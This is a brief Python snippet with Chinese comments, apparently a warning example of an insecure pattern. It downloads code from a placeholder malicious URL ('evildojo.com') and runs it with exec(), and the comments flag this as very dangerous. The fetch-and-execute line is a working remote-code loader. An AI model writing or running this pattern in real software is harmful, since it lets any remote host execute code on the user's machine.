import urllib.request

# 从恶意 URL 下载数据
url = "https://evildojo.com/malicious_code"
response = urllib.request.urlopen(url)

# 使用 eval 或 exec 执行（不安全示例）
malicious_code = response.read().decode('utf-8')
exec(malicious_code)  # 非常危险，可能导致执行恶意代码

response.close()
